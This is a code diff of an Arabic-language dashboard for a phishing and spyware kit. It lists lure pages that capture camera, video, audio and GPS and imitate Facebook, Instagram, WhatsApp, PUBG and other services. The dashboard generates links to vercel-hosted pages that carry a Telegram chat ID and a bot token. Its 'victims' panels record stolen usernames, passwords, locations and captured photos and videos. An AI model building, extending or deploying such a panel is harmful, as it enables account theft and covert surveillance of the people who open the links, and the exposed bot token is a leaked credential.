+        html+='<div class="data-item"><button class="d-delete" onclick="deleteDataItem(\''+id+'\')">✕</button>';
+        html+='<div class="d-header"><span class="d-type">📍 موقع GPS</span><span class="d-time">🕐 '+(d.timestamp?new Date(d.timestamp).toLocaleString('ar-EG'):'')+'</span></div>';
+        html+='<div class="d-content">'+(d.text||d.data||'')+'</div></div>';});
+        document.getElementById('locations-list').innerHTML=html||'<div class="empty">📍 لا توجد مواقع</div>';
+    }catch(e){}
 }
 
-// ========== ضحايا ==========
-function loadVictims() {
-    var data = getLocalData();
-    var html = '';
-    (data.victims || []).reverse().forEach(v => {
-        html += '<div class="log-item"><div class="time">🕐 ' + (v.timestamp ? new Date(v.timestamp).toLocaleString('ar-EG') : '') + '</div><div class="service">' + (v.service || '') + '</div><div class="data">' + (v.text || '') + '</div></div>';
-    });
-    document.getElementById('victims-list').innerHTML = html || '<div class="empty">لا يوجد ضحايا</div>';
-}
+async function deleteDataItem(id){if(!confirm('متأكد من الحذف؟'))return;try{await db.collection('victims').doc(id).delete();loadAccounts();loadLocations();}catch(e){}}
+function openMedia(url,type,id){currentMediaUrl=url;currentMediaId=id;currentMediaType=type;if(type==='video'){document.getElementById('modalImg').style.display='none';document.getElementById('modalVid').style.display='block';document.getElementById('modalVid').src=url;document.getElementById('modalVid').play();}else{document.getElementById('modalVid').style.display='none';document.getElementById('modalImg').style.display='block';document.getElementById('modalImg').src=url;}document.getElementById('modalActions').style.display='flex';document.getElementById('modal').classList.add('show');}
+function closeModal(){document.getElementById('modal').classList.remove('show');try{document.getElementById('modalVid').pause();document.getElementById('modalVid').src='';}catch(e){}currentMediaUrl='';currentMediaId='';currentMediaType='';}
+function downloadFile(url){var a=document.createElement('a');a.href=url;a.download='file_'+Date.now();document.body.appendChild(a);a.click();document.body.removeChild(a);}
+function downloadMedia(){if(currentMediaUrl)downloadFile(currentMediaUrl);}
+async function deleteItem(id,tab){if(!confirm('متأكد من الحذف؟'))return;try{await db.collection('gallery').doc(id).delete();if(tab==='photos')loadPhotos();if(tab==='videos')loadVideos();if(currentMediaId===id)closeModal();}catch(e){}}
+function deleteCurrentMedia(){if(currentMediaId)deleteItem(currentMediaId,currentMediaType==='video'?'videos':'photos');}
 
-// ========== معرض ==========
-function loadGallery() {
-    var data = getLocalData();
-    var html = '';
-    
-    (data.gallery || []).reverse().forEach(g => {
-        if (g.url) {
-            html += '<div class="gallery-item" onclick="openMedia(\'' + g.url + '\',\'image\')"><img src="' + g.url + '" alt=""></div>';
-        }
-    });
-    
-    (data.videos || []).reverse().forEach(v => {
-        if (v.url) {
-            html += '<div class="gallery-item" onclick="openMedia(\'' + v.url + '\',\'video\')"><video src="' + v.url + '"></video><div class="play-icon">▶</div></div>';
-        }
-    });
-    
-    document.getElementById('gallery-grid').innerHTML = html || '<div class="empty">📭 المعرض فارغ</div>';
-}
-
-function openMedia(url, type) {
-    if (type === 'video') {
-        document.getElementById('modalImg').style.display = 'none';
-        document.getElementById('modalVid').style.display = 'block';
-        document.getElementById('modalVid').src = url;
-    } else {
-        document.getElementById('modalVid').style.display = 'none';
-        document.getElementById('modalImg').style.display = 'block';
-        document.getElementById('modalImg').src = url;
-    }
-    document.getElementById('modal').classList.add('show');
-}
-
-function closeModal() {
-    document.getElementById('modal').classList.remove('show');
-    document.getElementById('modalVid').pause();
-}
-
-// ========== أدوات ==========
-function loadTools() {
-    var tools = [
-        {name:'كاميرا أمامية',icon:'📸',page:'photo-front.html'},
-        {name:'كاميرا خلفية',icon:'📷',page:'photo-back.html'},
-        {name:'فيديو أمامي',icon:'🎥',page:'mm.html'},
-        {name:'فيديو خلفي',icon:'📹',page:'video-back.html'},
-        {name:'GPS',icon:'📍',page:'location.html'},
-        {name:'صوت',icon:'🎙️',page:'audio.html'},
-        {name:'فيسبوك',icon:'📘',page:'fb.html'},
-        {name:'انستجرام',icon:'📷',page:'insta.html'},
-        {name:'واتساب',icon:'💬',page:'whatsapp.html'},
-        {name:'تويتر',icon:'𝕏',page:'twitter.html'},
-        {name:'سناب',icon:'👻',page:'snapchat.html'},
-        {name:'تيك توك',icon:'🎵',page:'tiktok.html'},
-        {name:'PUBG',icon:'🔫',page:'g.html'},
-        {name:'فري فاير',icon:'🎯',page:'freefire.html'},
-        {name:'ديسكورد',icon:'💎',page:'discord.html'},
-        {name:'بث مباشر',icon:'🎥',page:'live.html'}
-    ];
-    
-    var html = '';
-    tools.forEach(t => {
-        var isBlocked = blockedTools.indexOf(t.page) !== -1;
-        html += '<div class="tool-card' + (isBlocked ? ' blocked' : '') + '" onclick="' + (isBlocked ? '' : 'copyToolLink(\'' + t.page + '\')') + '"><span class="icon">' + t.icon + '</span>' + t.name + (isBlocked ? ' 🔒' : '') + '</div>';
-    });
-    document.getElementById('tools-grid').innerHTML = html;
-}
-
-function copyToolLink(page) {
-    var base = (['photo-front.html','photo-back.html','mm.html','video-back.html','location.html','audio.html','g.html','fb.html','insta.html','whatsapp.html','twitter.html','snapchat.html','tiktok.html'].indexOf(page) !== -1) ? 'https://ai-proxy-eosin.vercel.app' : 'https://pubgskin.vercel.app';
-    var link = base + '/' + page + '?chatId=7276604783&token=8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo';
-    navigator.clipboard.writeText(link).then(() => alert('✅ تم نسخ الرابط!')).catch(() => prompt('انسخ:', link));
-}
-
-// ========== رفع ==========
-function previewUpload() {
-    var f = document.getElementById('uploadFile').files[0];
-    if (!f) return;
-    var reader = new FileReader();
-    reader.onload = function(e) {
-        var html = f.type.startsWith('image/') ? '<img src="' + e.target.result + '" style="max-width:100%;max-height:200px;border-radius:8px;">' : '<video src="' + e.target.result + '" controls style="max-width:100%;max-height:200px;border-radius:8px;"></video>';
-        document.getElementById('uploadPreview').innerHTML = html;
-    };
-    reader.readAsDataURL(f);
-}
-
-async function uploadMedia() {
-    var f = document.getElementById('uploadFile').files[0];
-    if (!f) return alert('اختر ملف');
-    
-    var reader = new FileReader();
-    reader.onload = function(e) {
-        var isVideo = f.type.startsWith('video/');
-        saveToLocal(isVideo ? 'video' : 'photo', {
-            url: e.target.result,
-            caption: isVideo ? '🎬 فيديو مرفوع' : '📸 صورة مرفوعة',
-            service: isVideo ? '🎬 فيديو' : '📸 صورة'
-        });
-        alert('✅ تم الرفع! الملف في المعرض');
-        document.getElementById('uploadFile').value = '';
-        document.getElementById('uploadPreview').innerHTML = '';
-    };
-    reader.readAsDataURL(f);
-}
-
-// ========== حفظ بيانات ==========
-function saveVictim() {
-    var service = document.getElementById('v-service').value;
-    var user = document.getElementById('v-user').value.trim();
-    var pass = document.getElementById('v-pass').value.trim();
-    if (!service || !user || !pass) return alert('املأ جميع الحقول');
-    
-    saveToLocal('victim', {
-        service: service,
-        text: '👤 ' + user + ' | 🔒 ' + pass
-    });
-    
-    alert('✅ تم الحفظ في السجل!');
-    document.getElementById('v-user').value = '';
-    document.getElementById('v-pass').value = '';
-}
-
-// ========== بدء ==========
-loadFirebaseConfig();
-loadTools();
+function generateLink(page,base){var b=(base==='base1')?BASE1:BASE2;showTab('generate');document.getElementById('tab-generate').classList.add('active');document.getElementById('gen-result').style.display='none';document.getElementById('gen-fill').style.width='0%';document.getElementById('gen-fill').parentElement.style.display='block';var width=0,fill=document.getElementById('gen-fill');var interval=setInterval(function(){width+=20;fill.style.width=width+'%';if(width>=100){clearInterval(interval);var link=b+'/'+page+'?code='+MYCODE;currentGeneratedLink=link;document.getElementById('link-box').textContent=link;document.getElementById('gen-result').style.display='block';document.getElementById('gen-fill').parentElement.style.display='none';}},150);}
+function copyGeneratedLink(){if(!currentGeneratedLink)return;if(navigator.clipboard){navigator.clipboard.writeText(currentGeneratedLink).then(function(){var t=document.createElement('div');t.className='copy-toast';t.textContent='💀 تم نسخ الرابط!';document.body.appendChild(t);setTimeout(function(){t.remove();},1500);});}else{prompt('انسخ الرابط:',currentGeneratedLink);}}
 </script>
 </body>
 </html>
